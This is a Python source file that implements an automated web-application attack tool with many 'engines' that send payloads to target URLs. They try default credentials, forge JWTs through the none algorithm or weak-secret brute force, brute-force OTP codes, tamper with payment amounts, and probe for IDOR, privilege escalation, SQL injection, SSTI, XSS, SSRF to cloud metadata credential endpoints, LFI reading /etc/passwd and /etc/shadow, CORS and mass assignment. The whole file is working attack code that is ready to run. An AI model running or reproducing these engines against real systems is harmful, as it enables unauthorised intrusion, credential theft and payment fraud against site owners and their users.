"""
attack_engines.py — All Attack Engines (E08-E33)
Complete implementations of every attack category
MilkyWay Intelligence | Author: Sharlix
"""
import asyncio
import base64
import hashlib
import hmac
import json
import re
from typing import Dict, List, Optional
from protocols.http_client import HTTPClient

# ── Constants ──────────────────────────────────────────────
ID_PARAMS = [
    "id", "user_id", "userId", "order_id", "orderId", "uid",
    "pid", "doc_id", "file_id", "account_id", "accountId",
    "invoice_id", "ticket_id", "customer_id", "profile_id",
    "post_id", "comment_id", "member_id", "report_id"
]

WEAK_JWT_SECRETS = [
    "secret", "password", "123456", "jwt_secret", "mysecret",
    "test", "key", "private", "secretkey", "changeme",
    "supersecret", "qwerty", "letmein", "admin", "pass",
    "12345678", "token", "app_secret", "secret_key"
]

DEFAULT_CREDS = [
    ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
    ("test", "test"), ("user", "user"), ("root", "root"),
    ("admin", "admin123"), ("administrator", "administrator"),
    ("admin", "12345"), ("guest", "guest"), ("demo", "demo"),
    ("admin", "pass"), ("admin", "admin@123"),
]

SQLI_PAYLOADS = [
    "'", "' OR '1'='1", "' OR 1=1--", "\" OR \"1\"=\"1",
    "1' AND SLEEP(3)--", "'; SELECT 1--", "1 OR 1=1"
]
SQLI_ERRORS = [
    "sql syntax", "mysql_fetch", "ora-", "sqlite3",
    "pg_query", "microsoft sql", "syntax error",
    "unclosed quotation", "you have an error in your sql"
]

SSTI_PAYLOADS = [("{{7*7}}", "49"), ("${7*7}", "49"), ("#{7*7}", "49"),
                 ("{7*7}", "49"), ("<%=7*7%>", "49")]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "'\"><img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
]

SSRF_PROBES = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.170.2/v2/metadata",
]

SSRF_PARAMS = [
    "url", "uri", "path", "src", "source", "redirect", "next",
    "image", "link", "file", "fetch", "target", "load", "open",
    "callback", "return", "returnUrl", "return_url", "goto"
]

LFI_PAYLOADS = [
    "../../etc/passwd", "../../../etc/passwd",
    "....//....//etc/passwd", "%2e%2e%2fetc%2fpasswd",
    "..%2F..%2Fetc%2Fpasswd", "../../etc/shadow",
    "../../windows/win.ini", "../../../windows/win.ini",
    "php://filter/read=convert.base64-encode/resource=index.php",
    "../../../../etc/passwd%00",
]

PAYMENT_PARAMS = ["amount", "price", "total", "cost", "fee",
                  "charge", "value", "quantity", "discount"]
PAYMENT_VALUES = ["0", "-1", "0.001", "0.00", "-100",
                  "0.0000001", "999999", "-999"]


# ══════════════════════════════════════════════════════════
# E08 — Auth Bypass Engine
# ══════════════════════════════════════════════════════════
class AuthBypassEngine:
    def __init__(self, db, logger, http: HTTPClient, sm):
        self.db = db; self.logger = logger
        self.http = http; self.sm = sm; self.findings = []

    async def run(self, target_url: str = None) -> List[Dict]:
        self.findings = []
        nodes = self.db.get_nodes_by_type("AUTH")
        if target_url:
            nodes = [{"url": target_url}]
        if not nodes:
            self.logger.warn("Auth Bypass: no AUTH endpoints found")
            return []

        self.logger.info(f"Auth Bypass: testing {len(nodes)} endpoints")
        for node in nodes[:10]:
            await self._test_default_creds(node["url"])
            await self._test_otp_bypass(node["url"])
        await self._test_jwt_attacks()
        return self.findings

    async def _test_default_creds(self, url: str):
        if not any(x in url.lower() for x in
                   ["login", "signin", "auth", "token"]):
            return
        for username, password in DEFAULT_CREDS:
            for body in [{"username": username, "password": password},
                         {"email":    username, "password": password}]:
                resp = await self.http.post(url, json_data=body)
                if not resp:
                    resp = await self.http.post(url, data=body)
                if not resp:
                    continue
                if resp.status_code in (200, 201):
                    try:
                        rb = resp.json()
                        if any(k in str(rb).lower() for k in
                               ["token", "access", "session",
                                "welcome", "success", "login"]):
                            fid = self.db.add_finding(
                                type="DEFAULT_CREDS", severity="CRITICAL",
                                endpoint=url, param="credentials",
                                method="POST",
                                description=f"Default creds: {username}:{password}",
                                proof_request=f"POST {url} {json.dumps(body)}",
                                proof_response=resp.text[:400], confidence=95
                            )
                            self.findings.append({"id": fid, "type": "DEFAULT_CREDS"})
                            self.logger.finding("CRITICAL", "DEFAULT CREDS", url,
                                                f"{username}:{password}")
                            return
                    except Exception:
                        pass

    async def _test_jwt_attacks(self):
        for session in self.db.get_all_sessions():
            token = session.get("token") or ""
            if token.startswith("eyJ"):
                await self._jwt_none_alg(token)
                await self._jwt_weak_secret(token)

    async def _jwt_none_alg(self, token: str):
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return
            def dec(p):
                p += "=" * (4 - len(p) % 4)
                return json.loads(base64.urlsafe_b64decode(p))
            def enc(d):
                return base64.urlsafe_b64encode(
                    json.dumps(d, separators=(",", ":")).encode()
                ).rstrip(b"=").decode()
            header  = dec(parts[0])
            payload = dec(parts[1])
            header["alg"] = "none"
            for k in ("role", "roles", "is_admin", "admin", "type"):
                if k in payload:
                    payload[k] = "admin"
            tampered = f"{enc(header)}.{enc(payload)}."
            for node in self.db.get_nodes_by_type("ADMIN")[:3]:
                resp = await self.http.get(
                    node["url"],
                    extra_headers={"Authorization": f"Bearer {tampered}"}
                )
                if resp and resp.status_code == 200 and len(resp.content) > 50:
                    fid = self.db.add_finding(
                        type="JWT_NONE_ALG", severity="CRITICAL",
                        endpoint=node["url"], param="Authorization",
                        method="GET",
                        description="JWT none algorithm accepted",
                        proof_request=f"GET {node['url']} Bearer <none-alg>",
                        proof_response=resp.text[:400], confidence=92
                    )
                    self.findings.append({"id": fid, "type": "JWT_NONE_ALG"})
                    self.logger.finding("CRITICAL", "JWT NONE ALG", node["url"])
                    return
        except Exception:
            pass

    async def _jwt_weak_secret(self, token: str):
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return
            hp = f"{parts[0]}.{parts[1]}"
            sig_padded = parts[2] + "=" * (4 - len(parts[2]) % 4)
            signature  = base64.urlsafe_b64decode(sig_padded)
            for secret in WEAK_JWT_SECRETS:
                expected = hmac.new(
                    secret.encode(), hp.encode(), hashlib.sha256
                ).digest()
                if hmac.compare_digest(expected, signature):
                    fid = self.db.add_finding(
                        type="JWT_WEAK_SECRET", severity="CRITICAL",
                        endpoint="JWT Token", param="signature", method="N/A",
                        description=f"JWT weak secret found: '{secret}'",
                        proof_request=f"HMAC-SHA256 brute with secret='{secret}'",
                        proof_response="Token forgeable with admin claims",
                        confidence=97
                    )
                    self.findings.append({"id": fid, "type": "JWT_WEAK_SECRET"})
                    self.logger.finding("CRITICAL", "JWT WEAK SECRET",
                                        "JWT Token", f"secret={secret}")
                    return
        except Exception:
            pass

    async def _test_otp_bypass(self, url: str):
        if not any(x in url.lower() for x in
                   ["otp", "verify", "code", "2fa", "mfa", "confirm"]):
            return
        blocked = False
        for i in range(20):
            resp = await self.http.post(
                url,
                json_data={"otp": str(i).zfill(6),
                           "code": str(i).zfill(6)}
            )
            if resp and (resp.status_code == 429
                         or "too many" in (resp.text or "").lower()):
                blocked = True
                break
        if not blocked:
            fid = self.db.add_finding(
                type="OTP_NO_RATELIMIT", severity="HIGH",
                endpoint=url, param="otp", method="POST",
                description="OTP endpoint has no rate limiting",
                proof_request=f"POST {url} x20 — no block",
                proof_response="No 429 detected", confidence=85
            )
            self.findings.append({"id": fid, "type": "OTP_NO_RATELIMIT"})
            self.logger.finding("HIGH", "OTP NO RATE LIMIT", url)


# ══════════════════════════════════════════════════════════
# E12 — IDOR Engine
# ══════════════════════════════════════════════════════════
class IDOREngine:
    def __init__(self, db, logger, http: HTTPClient, sm):
        self.db = db; self.logger = logger
        self.http = http; self.sm = sm; self.findings = []

    async def run(self, target_url: str = None) -> List[Dict]:
        self.findings = []
        nodes = ([{"url": target_url, "method": '["GET"]', "params": "[]"}]
                 if target_url else self.db.get_all_nodes())

        testable = [
            n for n in nodes
            if (any(p.lower() in [x.lower() for x in ID_PARAMS]
                    for p in _parse(n.get("params", "[]")))
                or re.search(r"/\d+", n.get("url", "")))
        ]
        if not testable:
            self.logger.warn("IDOR: no ID-parameterized endpoints found")
            return []

        self.logger.info(f"IDOR: testing {len(testable)} endpoints")
        uid_a = self.sm.get_user_id("user_a")
        uid_b = self.sm.get_user_id("user_b")

        for node in testable[:30]:
            url     = node["url"]
            params  = _parse(node.get("params", "[]"))
            methods = _parse(node.get("method", '["GET"]'))
            for method in methods:
                await self._test_url_idor(url, method, params, uid_a, uid_b)
                await self._test_path_idor(url, method)
            self.db.mark_tested(url)

        return self.findings

    async def _test_url_idor(self, url, method, params, uid_a, uid_b):
        if not uid_b:
            return
        headers  = self.sm.get_headers_for_role("user_a")
        cookies  = self.sm.get_cookies_for_role("user_a")
        baseline = self.db.get_baseline(url, method)

        for param in params:
            if param.lower() not in [x.lower() for x in ID_PARAMS]:
                continue
            test_p = {param: uid_b}
            resp = await self.http.request(
                method, url,
                params=test_p if method == "GET" else None,
                json_data=test_p if method in ("POST","PUT","PATCH") else None,
                extra_headers=headers, session_cookies=cookies
            )
            if resp and self._is_idor(resp, baseline, uid_b):
                fid = self.db.add_finding(
                    type="IDOR", severity="HIGH", endpoint=url,
                    param=param, method=method,
                    description=f"IDOR: User A reads User B data via {param}",
                    proof_request=f"{method} {url} {param}={uid_b}",
                    proof_response=resp.text[:500], confidence=80
                )
                self.findings.append({"id": fid, "type": "IDOR"})
                self.logger.finding("HIGH", "IDOR", url, f"param={param}")

    async def _test_path_idor(self, url, method):
        m = re.search(r"/(\d+)(/|$)", url)
        if not m:
            return
        orig_id  = int(m.group(1))
        headers  = self.sm.get_headers_for_role("user_a")
        cookies  = self.sm.get_cookies_for_role("user_a")
        baseline = self.db.get_baseline(url, method)

        for test_id in [orig_id + 1, orig_id - 1, 1, 2]:
            if test_id <= 0:
                continue
            test_url = re.sub(r"/\d+(/|$)", f"/{test_id}\\1", url)
            if test_url == url:
                continue
            resp = await self.http.request(
                method, test_url,
                extra_headers=headers, session_cookies=cookies
            )
            if resp and self._is_idor(resp, baseline, str(test_id)):
                fid = self.db.add_finding(
                    type="IDOR", severity="HIGH", endpoint=url,
                    param="id_in_path", method=method,
                    description=f"IDOR: path {orig_id}→{test_id} returns data",
                    proof_request=f"{method} {test_url}",
                    proof_response=resp.text[:500], confidence=75
                )
                self.findings.append({"id": fid, "type": "IDOR"})
                self.logger.finding("HIGH", "IDOR (PATH)", test_url)
                break

    def _is_idor(self, resp, baseline, other_id: str) -> bool:
        if resp.status_code not in (200, 201):
            return False
        if len(resp.content) < 50:
            return False
        if baseline:
            diff = abs(len(resp.content) - baseline.get("body_size", 0))
            if diff < 50:
                return False
        try:
            body = resp.json()
            if isinstance(body, dict):
                user_fields = {"email", "username", "name", "phone", "address"}
                if any(k in body for k in user_fields):
                    return True
                if str(other_id) in str(body):
                    return True
        except Exception:
            pass
        return resp.status_code == 200 and len(resp.content) > 100


# ══════════════════════════════════════════════════════════
# E13 — Privilege Escalation Engine
# ══════════════════════════════════════════════════════════
class PrivEscEngine:
    def __init__(self, db, logger, http: HTTPClient, sm):
        self.db = db; self.logger = logger
        self.http = http; self.sm = sm; self.findings = []

    async def run(self, target_url: str = None) -> List[Dict]:
        self.findings = []
        nodes = ([{"url": target_url, "method": '["GET"]'}]
                 if target_url
                 else self.db.get_nodes_by_type("ADMIN")
                      + self.db.get_nodes_by_type("API"))
        if not nodes:
            return []
        self.logger.info(f"PrivEsc: testing {len(nodes)} endpoints")
        normal_hdrs = self.sm.get_headers_for_role("user_a")
        normal_cks  = self.sm.get_cookies_for_role("user_a")

        for node in nodes[:20]:
            url     = node["url"]
            methods = _parse(node.get("method", '["GET"]'))
            for method in methods:
                # Normal user on admin endpoint
                resp = await self.http.request(
                    method, url,
                    extra_headers=normal_hdrs, session_cookies=normal_cks
                )
                if resp and resp.status_code == 200 and len(resp.content) > 50:
                    fid = self.db.add_finding(
                        type="PRIV_ESC", severity="CRITICAL",
                        endpoint=url, param="Authorization",
                        method=method,
                        description="Normal user can access admin/restricted endpoint",
                        proof_request=f"{method} {url} with normal user token",
                        proof_response=resp.text[:400], confidence=85
                    )
                    self.findings.append({"id": fid, "type": "PRIV_ESC"})
                    self.logger.finding("CRITICAL", "PRIVILEGE ESCALATION", url)

                # Unauthenticated access
                resp2 = await self.http.request(method, url)
                if resp2 and resp2.status_code == 200 and len(resp2.content) > 50:
                    fid = self.db.add_finding(
                        type="BAC", severity="CRITICAL",
                        endpoint=url, param="auth", method=method,
                        description="Endpoint accessible without authentication",
                        proof_request=f"{method} {url} — no auth",
                        proof_response=resp2.text[:400], confidence=90
                    )
                    self.findings.append({"id": fid, "type": "BAC"})
                    self.logger.finding("CRITICAL", "BROKEN ACCESS CONTROL", url)
        return self.findings


# ══════════════════════════════════════════════════════════
# E17 — Payment Engine
# ══════════════════════════════════════════════════════════
class PaymentEngine:
    def __init__(self, db, logger, http: HTTPClient, sm):
        self.db = db; self.logger = logger
        self.http = http; self.sm = sm; self.findings = []

    async def run(self, target_url: str = None) -> List[Dict]:
        self.findings = []
        nodes = ([{"url": target_url, "method": '["POST"]', "params": "[]"}]
                 if target_url else self.db.get_nodes_by_type("PAYMENT"))
        if not nodes:
            return []
        hdrs = self.sm.get_headers_for_role("user_a")
        cks  = self.sm.get_cookies_for_role("user_a")
        self.logger.info(f"Payment: testing {len(nodes)} endpoints")

        for node in nodes:
            url    = node["url"]
            params = _parse(node.get("params", "[]"))
            pay_p  = [p for p in params if p.lower() in PAYMENT_PARAMS]
            if not pay_p:
                pay_p = PAYMENT_PARAMS[:3]

            for param in pay_p:
                for val in PAYMENT_VALUES:
                    resp = await self.http.request(
                        "POST", url, json_data={param: val},
                        extra_headers=hdrs, session_cookies=cks
                    )
                    if resp and resp.status_code in (200, 201):
                        try:
                            rb = resp.json()
                            if any(s in str(rb).lower() for s in
                                   ["order", "success", "confirmed",
                                    "transaction", "id"]):
                                fid = self.db.add_finding(
                                    type="PAYMENT_BYPASS", severity="CRITICAL",
                                    endpoint=url, param=param, method="POST",
                                    description=f"Payment bypass: {param}={val}",
                                    proof_request=f"POST {url} {param}={val}",
                                    proof_response=resp.text[:400], confidence=85
                                )
                                self.findings.append({"id": fid, "type": "PAYMENT_BYPASS"})
                                self.logger.finding("CRITICAL", "PAYMENT BYPASS",
                                                    url, f"{param}={val}")
                                break
                        except Exception:
                            pass
        return self.findings


# ══════════════════════════════════════════════════════════
# E19 — Race Condition Engine
# ══════════════════════════════════════════════════════════
class RaceConditionEngine:
    def __init__(self, db, logger, http: HTTPClient, sm):
        self.db = db; self.logger = logger
        self.http = http; self.sm = sm; self.findings = []

    async def run(self, target_url: str = None,
                  concurrent: int = 30) -> List[Dict]:
        self.findings = []
        nodes = ([{"url": target_url}]
                 if target_url
                 else self.db.get_nodes_by_type("PAYMENT")
                      + self.db.get_nodes_by_type("AUTH"))
        if not nodes:
            return []
        hdrs = self.sm.get_headers_for_role("user_a")
        cks  = self.sm.get_cookies_for_role("user_a")

        for node in nodes[:5]:
            url = node["url"]
            self.logger.info(f"Race: {concurrent} concurrent → {url}")
            reqs = [{"method": "POST", "url": url,
                     "extra_headers": hdrs, "session_cookies": cks}
                    for _ in range(concurrent)]
            results = await self.http.send_parallel(reqs, concurrent)
            successes = [r for r in results
                         if not isinstance(r, Exception)
                         and r and r.status_code in (200, 201)]
            if len(successes) > 1:
                fid = self.db.add_finding(
                    type="RACE_CONDITION", severity="HIGH",
                    endpoint=url, param="concurrent", method="POST",
                    description=f"Race condition: {len(successes)}/{concurrent} succeeded",
                    proof_request=f"{concurrent} simultaneous POST {url}",
                    proof_response=f"{len(successes)} success responses",
                    confidence=80
                )
                self.findings.append({"id": fid, "type": "RACE_CONDITION"})
                self.logger.finding("HIGH", "RACE CONDITION", url,
                                    f"{len(successes)} simultaneous")
        return self.findings


# ══════════════════════════════════════════════════════════
# E20 — Injection Engine (SQLi + SSTI + Command)
# ══════════════════════════════════════════════════════════
class InjectionEngine:
    def __init__(self, db, logger, http: HTTPClient, sm):
        self.db = db; self.logger = logger
        self.http = http; self.sm = sm; self.findings = []

    async def run(self, target_url: str = None) -> List[Dict]:
        self.findings = []
        nodes = ([{"url": target_url, "params": "[]"}]
                 if target_url else self.db.get_all_nodes())
        hdrs = self.sm.get_headers_for_role("user_a")
        cks  = self.sm.get_cookies_for_role("user_a")
        self.logger.info(f"Injection: testing {min(len(nodes), 30)} endpoints")

        for node in nodes[:30]:
            url    = node["url"]
            params = _parse(node.get("params", "[]"))
            for param in params[:5]:
                await self._test_sqli(url, param, hdrs, cks)
                await self._test_ssti(url, param, hdrs, cks)
        return self.findings

    async def _test_sqli(self, url, param, hdrs, cks):
        for payload in SQLI_PAYLOADS[:4]:
            resp = await self.http.get(url, params={param: payload},
                                        extra_headers=hdrs, session_cookies=cks)
            if not resp:
                continue
            body_lower = resp.text.lower()
            for err in SQLI_ERRORS:
                if err in body_lower:
                    fid = self.db.add_finding(
                        type="SQLI", severity="CRITICAL",
                        endpoint=url, param=param, method="GET",
                        description=f"SQL Injection via param '{param}'",
                        proof_request=f"GET {url}?{param}={payload}",
                        proof_response=resp.text[:400], confidence=90
                    )
                    self.findings.append({"id": fid, "type": "SQLI"})
                    self.logger.finding("CRITICAL", "SQL INJECTION", url,
                                        f"param={param}")
                    return

    async def _test_ssti(self, url, param, hdrs, cks):
        for payload, expected in SSTI_PAYLOADS:
            resp = await self.http.get(url, params={param: payload},
                                        extra_headers=hdrs, session_cookies=cks)
            if resp and expected in resp.text:
                fid = self.db.add_finding(
                    type="SSTI", severity="CRITICAL",
                    endpoint=url, param=param, method="GET",
                    description=f"SSTI: {payload} = {expected}",
                    proof_request=f"GET {url}?{param}={payload}",
                    proof_response=resp.text[:400], confidence=95
                )
                self.findings.append({"id": fid, "type": "SSTI"})
                self.logger.finding("CRITICAL", "SSTI → RCE", url,
                                    f"param={param}")
                return


# ══════════════════════════════════════════════════════════
# E21 — XSS Engine
# ══════════════════════════════════════════════════════════
class XSSEngine:
    def __init__(self, db, logger, http: HTTPClient, sm):
        self.db = db; self.logger = logger
        self.http = http; self.sm = sm; self.findings = []

    async def run(self, target_url: str = None) -> List[Dict]:
        self.findings = []
        nodes = ([{"url": target_url, "params": "[]"}]
                 if target_url else self.db.get_all_nodes())
        hdrs = self.sm.get_headers_for_role("user_a")
        cks  = self.sm.get_cookies_for_role("user_a")
        self.logger.info(f"XSS: testing {min(len(nodes), 30)} endpoints")

        for node in nodes[:30]:
            url    = node["url"]
            params = _parse(node.get("params", "[]"))
            for param in params[:5]:
                for payload in XSS_PAYLOADS[:3]:
                    resp = await self.http.get(
                        url, params={param: payload},
                        extra_headers=hdrs, session_cookies=cks
                    )
                    if resp and payload in resp.text:
                        fid = self.db.add_finding(
                            type="XSS", severity="HIGH",
                            endpoint=url, param=param, method="GET",
                            description=f"Reflected XSS via param '{param}'",
                            proof_request=f"GET {url}?{param}={payload}",
                            proof_response=resp.text[:400], confidence=85
                        )
                        self.findings.append({"id": fid, "type": "XSS"})
                        self.logger.finding("HIGH", "XSS REFLECTED", url,
                                            f"param={param}")
                        break
        return self.findings


# ══════════════════════════════════════════════════════════
# E22 — SSRF Engine
# ══════════════════════════════════════════════════════════
class SSRFEngine:
    def __init__(self, db, logger, http: HTTPClient, sm):
        self.db = db; self.logger = logger
        self.http = http; self.sm = sm; self.findings = []

    async def run(self, target_url: str = None) -> List[Dict]:
        self.findings = []
        nodes = ([{"url": target_url, "params": "[]"}]
                 if target_url else self.db.get_all_nodes())
        hdrs = self.sm.get_headers_for_role("user_a")
        cks  = self.sm.get_cookies_for_role("user_a")

        for node in nodes[:30]:
            url    = node["url"]
            params = _parse(node.get("params", "[]"))
            ssrf_p = [p for p in params if p.lower() in SSRF_PARAMS]
            for param in ssrf_p:
                for probe in SSRF_PROBES[:2]:
                    resp = await self.http.get(
                        url, params={param: probe},
                        extra_headers=hdrs, session_cookies=cks
                    )
                    if resp and resp.status_code == 200:
                        if any(x in resp.text for x in
                               ["ami-id", "instance-id", "security-credentials",
                                "computeMetadata", "iam"]):
                            fid = self.db.add_finding(
                                type="SSRF", severity="CRITICAL",
                                endpoint=url, param=param, method="GET",
                                description=f"SSRF: cloud metadata via '{param}'",
                                proof_request=f"GET {url}?{param}={probe}",
                                proof_response=resp.text[:400], confidence=95
                            )
                            self.findings.append({"id": fid, "type": "SSRF"})
                            self.logger.finding("CRITICAL", "SSRF → CLOUD METADATA",
                                                url, f"param={param}")
                            break
        return self.findings


# ══════════════════════════════════════════════════════════
# E28 — CORS Engine
# ══════════════════════════════════════════════════════════
class CORSEngine:
    ORIGINS = [
        "https://evil.com", "null",
        "https://attacker.com", "https://evil.target.com"
    ]

    def __init__(self, db, logger, http: HTTPClient, sm):
        self.db = db; self.logger = logger
        self.http = http; self.sm = sm; self.findings = []

    async def run(self, target_url: str = None) -> List[Dict]:
        self.findings = []
        nodes = ([{"url": target_url}]
                 if target_url else self.db.get_all_nodes())
        hdrs = self.sm.get_headers_for_role("user_a")
        cks  = self.sm.get_cookies_for_role("user_a")
        self.logger.info(f"CORS: testing {min(len(nodes), 50)} endpoints")

        for node in nodes[:50]:
            url = node["url"]
            for origin in self.ORIGINS:
                resp = await self.http.get(
                    url,
                    extra_headers={**hdrs, "Origin": origin},
                    session_cookies=cks
                )
                if not resp:
                    continue
                acao = resp.headers.get("Access-Control-Allow-Origin", "")
                acac = resp.headers.get("Access-Control-Allow-Credentials", "")
                if acao == origin:
                    sev = "CRITICAL" if acac.lower() == "true" else "MEDIUM"
                    fid = self.db.add_finding(
                        type="CORS", severity=sev,
                        endpoint=url, param="Origin", method="GET",
                        description=f"CORS reflects '{origin}', creds={acac}",
                        proof_request=f"GET {url} Origin: {origin}",
                        proof_response=f"ACAO:{acao} ACAC:{acac}",
                        confidence=90
                    )
                    self.findings.append({"id": fid, "type": "CORS"})
                    self.logger.finding(sev, "CORS MISCONFIG", url,
                                        f"origin={origin} creds={acac}")
                    break
        return self.findings


# ══════════════════════════════════════════════════════════
# E29 — Rate Limit Engine
# ══════════════════════════════════════════════════════════
class RateLimitEngine:
    def __init__(self, db, logger, http: HTTPClient, sm):
        self.db = db; self.logger = logger
        self.http = http; self.sm = sm; self.findings = []

    async def run(self, target_url: str = None) -> List[Dict]:
        self.findings = []
        nodes = ([{"url": target_url}]
                 if target_url else self.db.get_nodes_by_type("AUTH"))
        for node in nodes[:5]:
            await self._test(node["url"])
        return self.findings

    async def _test(self, url: str):
        self.logger.info(f"Rate limit: testing {url}")
        blocked = False
        for i in range(30):
            resp = await self.http.post(
                url, json_data={"username": f"test{i}@t.com",
                                "password": "wrongpass"}
            )
            if resp and (resp.status_code == 429
                         or "too many" in (resp.text or "").lower()):
                blocked = True
                break
        if not blocked:
            fid = self.db.add_finding(
                type="RATE_LIMIT_BYPASS", severity="MEDIUM",
                endpoint=url, param="requests", method="POST",
                description="No rate limiting — unlimited requests allowed",
                proof_request=f"POST {url} x30 — no block",
                proof_response="No 429 received", confidence=80
            )
            self.findings.append({"id": fid, "type": "RATE_LIMIT_BYPASS"})
            self.logger.finding("MEDIUM", "NO RATE LIMITING", url)


# ══════════════════════════════════════════════════════════
# E32 — LFI Engine
# ══════════════════════════════════════════════════════════
class LFIEngine:
    LFI_PARAMS = ["file", "path", "include", "load", "template",
                  "view", "page", "document", "dir", "folder", "name"]

    def __init__(self, db, logger, http: HTTPClient, sm):
        self.db = db; self.logger = logger
        self.http = http; self.sm = sm; self.findings = []

    async def run(self, target_url: str = None) -> List[Dict]:
        self.findings = []
        nodes = ([{"url": target_url, "params": "[]"}]
                 if target_url else self.db.get_all_nodes())
        hdrs = self.sm.get_headers_for_role("user_a")
        cks  = self.sm.get_cookies_for_role("user_a")

        for node in nodes[:30]:
            url    = node["url"]
            params = _parse(node.get("params", "[]"))
            lfi_p  = [p for p in params if p.lower() in self.LFI_PARAMS]
            for param in lfi_p:
                for payload in LFI_PAYLOADS[:5]:
                    resp = await self.http.get(
                        url, params={param: payload},
                        extra_headers=hdrs, session_cookies=cks
                    )
                    if resp and resp.status_code == 200:
                        if ("root:" in resp.text
                                or "daemon:" in resp.text
                                or "[extensions]" in resp.text):
                            fid = self.db.add_finding(
                                type="LFI", severity="CRITICAL",
                                endpoint=url, param=param, method="GET",
                                description=f"LFI via param '{param}'",
                                proof_request=f"GET {url}?{param}={payload}",
                                proof_response=resp.text[:400], confidence=95
                            )
                            self.findings.append({"id": fid, "type": "LFI"})
                            self.logger.finding("CRITICAL", "LFI", url,
                                                f"param={param}")
                            break
        return self.findings


# ══════════════════════════════════════════════════════════
# E15 — Mass Assignment Engine
# ══════════════════════════════════════════════════════════
class MassAssignmentEngine:
    INJECT_FIELDS = [
        ("role",      ["admin", "superuser"]),
        ("is_admin",  ["true", "1"]),
        ("admin",     ["true", "1"]),
        ("verified",  ["true", "1"]),
    ]

    def __init__(self, db, logger, http: HTTPClient, sm):
        self.db = db; self.logger = logger
        self.http = http; self.sm = sm; self.findings = []

    async def run(self, target_url: str = None) -> List[Dict]:
        self.findings = []
        nodes = ([{"url": target_url, "method": '["POST"]', "params": "[]"}]
                 if target_url
                 else [n for n in self.db.get_all_nodes()
                       if any(m in n.get("method", "")
                              for m in ["POST", "PUT", "PATCH"])])
        hdrs = self.sm.get_headers_for_role("user_a")
        cks  = self.sm.get_cookies_for_role("user_a")

        for node in nodes[:20]:
            url    = node["url"]
            params = _parse(node.get("params", "[]"))
            base   = {p: "test" for p in params[:5]}
            for field, values in self.INJECT_FIELDS:
                body = {**base, field: values[0]}
                resp = await self.http.post(
                    url, json_data=body,
                    extra_headers=hdrs, session_cookies=cks
                )
                if resp and resp.status_code in (200, 201):
                    if field in resp.text:
                        fid = self.db.add_finding(
                            type="MASS_ASSIGNMENT", severity="HIGH",
                            endpoint=url, param=field, method="POST",
                            description=f"Mass assignment: '{field}' accepted",
                            proof_request=f"POST {url} {field}={values[0]}",
                            proof_response=resp.text[:400], confidence=75
                        )
                        self.findings.append({"id": fid,
                                              "type": "MASS_ASSIGNMENT"})
                        self.logger.finding("HIGH", "MASS ASSIGNMENT", url,
                                            f"field={field}")
        return self.findings


# ══════════════════════════════════════════════════════════
# E25 — GraphQL Engine
# ══════════════════════════════════════════════════════════
class GraphQLEngine:
    INTROSPECTION = """{"query":"{__schema{types{name fields{name type{name kind}}}}}"}"""

    def __init__(self, db, logger, http: HTTPClient, sm):
        self.db = db; self.logger = logger
        self.http = http; self.sm = sm; self.findings = []

    async def run(self, target_url: str = None) -> List[Dict]:
        self.findings = []
        nodes = ([{"url": target_url}]
                 if target_url else self.db.get_nodes_by_type("GRAPHQL"))

        for node in nodes[:5]:
            url  = node["url"]
            hdrs = {**self.sm.get_headers_for_role("user_a"),
                    "Content-Type": "application/json"}
            # Test introspection
            resp = await self.http.post(url, json_data=json.loads(self.INTROSPECTION),
                                         extra_headers=hdrs)
            if resp and resp.status_code == 200:
                try:
                    data = resp.json()
                    if "__schema" in str(data):
                        fid = self.db.add_finding(
                            type="GRAPHQL_INTROSPECTION", severity="MEDIUM",
                            endpoint=url, param="query", method="POST",
                            description="GraphQL introspection enabled — full schema exposed",
                            proof_request=f"POST {url} with introspection query",
                            proof_response=resp.text[:600], confidence=90
                        )
                        self.findings.append({"id": fid,
                                              "type": "GRAPHQL_INTROSPECTION"})
                        self.logger.finding("MEDIUM", "GRAPHQL INTROSPECTION", url)
                except Exception:
                    pass
        return self.findings


# ── Helpers ────────────────────────────────────────────────
def _parse(s) -> list:
    if isinstance(s, list):
        return s
    try:
        return json.loads(s)
    except Exception:
        return []
